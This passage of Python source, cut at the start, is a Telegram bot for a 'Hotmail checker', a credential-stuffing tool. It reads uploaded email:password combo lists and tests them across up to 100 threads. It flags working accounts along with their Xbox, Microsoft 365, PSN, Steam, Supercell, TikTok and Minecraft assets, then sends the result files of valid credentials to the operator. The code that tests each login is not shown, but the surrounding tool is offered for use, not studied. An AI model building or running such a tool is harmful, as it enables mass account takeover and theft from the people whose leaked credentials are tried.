<b>⛏️ Minecraft:</b> {stats.minecraft_hits}
━━━━━━━━━━━━━━━━━━━━━━━
<b>📊 Total:</b> {stats.checked}/{total_lines}
<b>⚡ Speed:</b> {cpm:.0f} CPM | <b>⏱️ Time:</b> {time_str}
"""


def build_setup_keyboard():
    markup = InlineKeyboardMarkup(row_width=3)
    markup.add(
        InlineKeyboardButton("All", callback_data="mode_all"),
        InlineKeyboardButton("Microsoft", callback_data="mode_microsoft"),
        InlineKeyboardButton("PSN", callback_data="mode_psn"),
    )
    markup.add(
        InlineKeyboardButton("Steam", callback_data="mode_steam"),
        InlineKeyboardButton("Supercell", callback_data="mode_supercell"),
        InlineKeyboardButton("TikTok", callback_data="mode_tiktok"),
    )
    markup.add(InlineKeyboardButton("Minecraft", callback_data="mode_minecraft"))

    thread_buttons = [InlineKeyboardButton(str(i), callback_data=f"threads_{i}") for i in range(1, 11)]
    markup.add(*thread_buttons[:5])
    markup.add(*thread_buttons[5:])
    markup.add(
        InlineKeyboardButton("20", callback_data="threads_20"),
        InlineKeyboardButton("40", callback_data="threads_40"),
        InlineKeyboardButton("60", callback_data="threads_60"),
        InlineKeyboardButton("80", callback_data="threads_80"),
        InlineKeyboardButton("100", callback_data="threads_100"),
    )
    return markup


def build_running_keyboard():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_status"),
        InlineKeyboardButton("📌 SUMMARY", callback_data="summary_now"),
    )
    markup.add(InlineKeyboardButton("⛔ STOP CHECKING", callback_data="stop_check"))
    return markup

def check_process():
    global checking_active, stop_checking, stats, result_mgr, current_message, threads_count, selected_mode
    
    try:
        valid_combos = []
        checker = HotmailChecker(check_mode=selected_mode)
        
        for line in combo_lines:
            if stop_checking:
                break
            parsed = checker.parse_combo_line(line)
            if parsed:
                valid_combos.append(parsed)
        
        total_lines = len(valid_combos)
        stats = LiveStats(total_lines)
        
        print(f"\n{Colors.GREEN}✅ Started checking {total_lines} accounts with {threads_count} threads{Colors.END}\n")
        
        mode_label = CHECK_MODES.get(selected_mode, "ALL SERVICES")
        status_msg = generate_status_message(stats, mode_label)
        markup = build_running_keyboard()
        
        current_message = bot.edit_message_text(
            status_msg,
            chat_id=ADMIN_ID,
            message_id=current_message.message_id,
            reply_markup=markup
        )
        
        def process_account(account):
            if stop_checking:
                return
            
            email, password = account
            stats.set_current(email)
            local_checker = HotmailChecker(check_mode=selected_mode)
            result = local_checker.check(email, password)
            
            if result["status"] == "HIT":
                stats.update("HIT", result)
                result_mgr.save_result(email, password, "HIT", result)
                
                # Print hit with details
                details = []
                if result.get('subscriptions'):
                    for sub in result['subscriptions']:
                        details.append(sub.get('name', ''))
                if result.get('psn_orders', 0) > 0:
                    details.append(f"Orders: {result['psn_orders']}")
                if result.get('steam_count', 0) > 0:
                    details.append(f"Games: {result['steam_count']}")
                if result.get('supercell_games'):
                    details.append(', '.join(result['supercell_games']))
                if result.get('tiktok_username'):
                    details.append(f"@{result['tiktok_username']}")
                if result.get('minecraft_username'):
                    details.append(result['minecraft_username'])
                
                detail_str = f" | {' | '.join(details)}" if details else ""
                print(f"{Colors.GREEN}✓ HIT: {email}:{password}{detail_str}{Colors.END}")
                
            elif result["status"] == "2FA":
                stats.update("2FA")
                result_mgr.save_result(email, password, "2FA")
                print(f"{Colors.YELLOW}🔐 2FA: {email}{Colors.END}")
            else:
                stats.update("BAD")
                result_mgr.save_result(email, password, "BAD")

            print_terminal_status(stats)
            if stats.should_update_telegram():
                try:
                    status_msg = generate_status_message(stats, mode_label)
                    safe_edit_message(
                        ADMIN_ID,
                        current_message.message_id,
                        status_msg,
                        markup
                    )
                except:
                    pass
        
        with ThreadPoolExecutor(max_workers=threads_count) as executor:
            executor.map(process_account, valid_combos)
        
        time.sleep(1)
        status_msg = generate_status_message(stats, mode_label)
        safe_edit_message(ADMIN_ID, current_message.message_id, status_msg, markup)
        
        print(f"\n\n{Colors.CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.END}")
        
        if stop_checking:
            final_message = "<b>⛔ CHECKING STOPPED BY USER</b>\n\n"
            print(f"{Colors.YELLOW}⛔ Checking stopped by user{Colors.END}")
        else:
            final_message = "<b>✅ CHECKING COMPLETED</b>\n\n"
            print(f"{Colors.GREEN}✅ Checking completed{Colors.END}")
        
        elapsed, cpm, progress = stats.get_progress()
        time_str = time.strftime("%H:%M:%S", time.gmtime(elapsed))
        
        final_message += f"""
<b>📊 FINAL RESULTS</b>
━━━━━━━━━━━━━━━━━━━━━━━
<b>Mode:</b> {mode_label}
<b>✓ True:</b> {stats.hits}
<b>✗ Bad:</b> {stats.bads}
<b>🔐 2FA:</b> {stats.twofa}
━━━━━━━━━━━━━━━━━━━━━━━
<b>🎮 Xbox Free:</b> {stats.xbox_free}
<b>🎮 Xbox Premium:</b> {stats.xbox_premium}
<b>💎 Premium:</b> {stats.premium}
<b>🎯 PSN:</b> {stats.psn_hits}
<b>🎲 Steam:</b> {stats.steam_hits}
<b>⚔️ Supercell:</b> {stats.supercell_hits}
<b>📱 TikTok:</b> {stats.tiktok_hits}
<b>⛏️ Minecraft:</b> {stats.minecraft_hits}
━━━━━━━━━━━━━━━━━━━━━━━
<b>⏱️ Time:</b> {time_str}
<b>⚡ Speed:</b> {cpm:.0f} CPM
<b>📊 Total:</b> {stats.checked}/{total_lines}
━━━━━━━━━━━━━━━━━━━━━━━
"""
        
        print(f"\n{Colors.WHITE}Time: {time_str} | Speed: {cpm:.0f} CPM{Colors.END}")
        print(f"{Colors.GREEN}Hits: {stats.hits}{Colors.END} | {Colors.YELLOW}2FA: {stats.twofa}{Colors.END} | {Colors.RED}Bad: {stats.bads}{Colors.END}")
        print(f"{Colors.MAGENTA}Xbox Premium: {stats.xbox_premium}{Colors.END} | {Colors.BLUE}PSN: {stats.psn_hits}{Colors.END}")
        print(f"{Colors.CYAN}Steam: {stats.steam_hits}{Colors.END} | {Colors.YELLOW}Supercell: {stats.supercell_hits}{Colors.END}")
        print(f"{Colors.MAGENTA}TikTok: {stats.tiktok_hits}{Colors.END} | {Colors.GREEN}Minecraft: {stats.minecraft_hits}{Colors.END}\n")
        
        safe_edit_message(ADMIN_ID, current_message.message_id, final_message)
        
        result_files = result_mgr.get_files_with_content()
        if result_files:
            bot.send_message(ADMIN_ID, "<b>📤 Sending result files...</b>")
            print(f"{Colors.CYAN}📤 Sending result files...{Colors.END}")
            
            for file_path in result_files:
                try:
                    with open(file_path, 'rb') as f:
                        file_name = os.path.basename(file_path)
                        bot.send_document(ADMIN_ID, f, caption=f"<b>{file_name}</b>")
                        print(f"{Colors.GREEN}✓ Sent: {file_name}{Colors.END}")
                    time.sleep(1)
                except:
                    print(f"{Colors.RED}✗ Failed: {file_name}{Colors.END}")
            
            bot.send_message(ADMIN_ID, "<b>✅ All files sent!</b>")
            print(f"{Colors.GREEN}✅ All files sent!{Colors.END}")
        
    except Exception as e:
        print(f"{Colors.RED}❌ Error: {str(e)}{Colors.END}")
        bot.send_message(ADMIN_ID, f"<b>❌ Error: {str(e)}</b>")
    finally:
        checking_active = False
        stop_checking = False

@bot.message_handler(commands=['start'])
def start_command(message):
    if message.from_user.id != ADMIN_ID:
        return
    
    welcome_msg = """
<b>🔥 HOTMAIL CHECKER BOT 🔥</b>
━━━━━━━━━━━━━━━━━━━━━━━
<b>• Send me a combo file</b>
<b>• Checks all services:</b>
  🎮 Xbox Game Pass
  💎 Microsoft 365
  🎯 PlayStation Network
  🎲 Steam Games
  ⚔️ Supercell Games
  📱 TikTok Accounts
  ⛏️ Minecraft Accounts
━━━━━━━━━━━━━━━━━━━━━━━

<b>📁 Send a .txt file with your combos</b>
<code>Supported formats:</code>
• email:password
• Complex formats with extra data
"""
    bot.reply_to(message, welcome_msg)
    print(f"{Colors.GREEN}✅ Bot started. Admin: {message.from_user.id}{Colors.END}")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    global checking_active, result_mgr, combo_lines, current_message, threads_count, selected_mode
    
    if message.from_user.id != ADMIN_ID:
        return
    
    if checking_active:
        bot.reply_to(message, "<b>❌ A check is already in progress!</b>")
        return
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        file_name = message.document.file_name
        file_path = f"combo_{int(time.time())}.txt"
        
        with open(file_path, 'wb') as f:
            f.write(downloaded_file)
        
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            combo_lines = [line.strip() for line in f.readlines() if line.strip()]
        
        checker = HotmailChecker()
        valid_count = 0
        for line in combo_lines:
            if checker.parse_combo_line(line):
                valid_count += 1
        
        print(f"{Colors.CYAN}📁 File received: {file_name}{Colors.END}")
        print(f"{Colors.WHITE}Total lines: {len(combo_lines)}{Colors.END}")
        print(f"{Colors.GREEN}Valid combos: {valid_count}{Colors.END}")
        
        selected_label = CHECK_MODES.get(selected_mode, "ALL SERVICES")
        markup = build_setup_keyboard()
        
        msg = f"""
<b>📁 FILE RECEIVED</b>
━━━━━━━━━━━━━━━━━━━━━━━
<b>File:</b> {file_name[:30]}
<b>Total lines:</b> {len(combo_lines)}
<b>Valid combos:</b> {valid_count}
<b>Mode:</b> {selected_label}
━━━━━━━━━━━━━━━━━━━━━━━

<b>1) Select check mode (optional)</b>
<b>2) Select threads to start (1-100)</b>
"""
        bot.reply_to(message, msg, reply_markup=markup)
        
    except Exception as e:
        print(f"{Colors.RED}❌ Error: {str(e)}{Colors.END}")
        bot.reply_to(message, f"<b>❌ Error: {str(e)}</b>")

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    global checking_active, threads_count, result_mgr, current_message, stop_checking, selected_mode, stats
    
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ Unauthorized")
        return
    
    if call.data.startswith("mode_"):
        selected_mode = call.data.replace("mode_", "", 1)
        selected_label = CHECK_MODES.get(selected_mode, "ALL SERVICES")
        try:
            updated_text = call.message.text
            if "<b>Mode:</b>" in updated_text:
                updated_text = re.sub(r"<b>Mode:</b>.*", f"<b>Mode:</b> {selected_label}", updated_text)
            safe_edit_message(
                ADMIN_ID,
                call.message.message_id,
                updated_text,
                build_setup_keyboard()
            )
        except:
            pass
        bot.answer_callback_query(call.id, f"✅ Mode: {selected_label}")

    elif call.data.startswith("threads_"):
        threads_count = int(call.data.split("_")[1])
        result_mgr = ResultManager(f"combo_{int(time.time())}")
        
        checking_active = True
        stop_checking = False
        
        mode_label = CHECK_MODES.get(selected_mode, "ALL SERVICES")
        stats = LiveStats(len(combo_lines))
        status_msg = generate_status_message(stats, mode_label)
        markup = build_running_keyboard()
        
        current_message = bot.edit_message_text(
            status_msg,
            chat_id=ADMIN_ID,
            message_id=call.message.message_id,
            reply_markup=markup
        )
        
        print(f"{Colors.GREEN}✅ Starting check with {threads_count} threads | Mode: {mode_label}{Colors.END}")
        
        thread = Thread(target=check_process)
        thread.daemon = True
        thread.start()
        bot.answer_callback_query(call.id, f"✅ Started: {mode_label} | {threads_count} threads")

    elif call.data == "refresh_status":
        if checking_active and stats and current_message:
            mode_label = CHECK_MODES.get(selected_mode, "ALL SERVICES")
            status_msg = generate_status_message(stats, mode_label)
            safe_edit_message(ADMIN_ID, current_message.message_id, status_msg, build_running_keyboard())
            bot.answer_callback_query(call.id, "🔄 Refreshed")
        else:
            bot.answer_callback_query(call.id, "❌ No active check")

    elif call.data == "summary_now":
        if checking_active and stats:
            mode_label = CHECK_MODES.get(selected_mode, "ALL SERVICES")
            bot.send_message(ADMIN_ID, generate_quick_summary(stats, len(combo_lines), mode_label))
            bot.answer_callback_query(call.id, "📌 Summary sent")
        else:
            bot.answer_callback_query(call.id, "❌ No active check")
        
    elif call.data == "stop_check":
        if checking_active:
            stop_checking = True
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔄 STOPPING...", callback_data="none"))
            try:
                safe_edit_message(
                    ADMIN_ID,
                    call.message.message_id,
                    call.message.text,
                    markup
                )
            except:
                pass
            print(f"{Colors.YELLOW}⛔ Stop requested by user{Colors.END}")
            bot.answer_callback_query(call.id, "⛔ Stopping checker...")
        else:
            bot.answer_callback_query(call.id, "❌ No active check")

@bot.message_handler(func=lambda message: True)
def handle_all(message):
    if message.from_user.id != ADMIN_ID:
        return
    bot.reply_to(message, "<b>❌ Please send a .txt file with your combos</b>")

Path("results").mkdir(exist_ok=True)

if __name__ == "__main__":
    clear_screen()
    print_banner()
    print(f"{Colors.GREEN}✅ Bot is running...{Colors.END}")
    print(f"{Colors.YELLOW}👤 Admin ID: {ADMIN_ID}{Colors.END}")
    print(f"{Colors.CYAN}⚡ Waiting for commands...{Colors.END}\n")
    
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            print(f"{Colors.RED}❌ Bot error: {e}{Colors.END}")
            time.sleep(5)
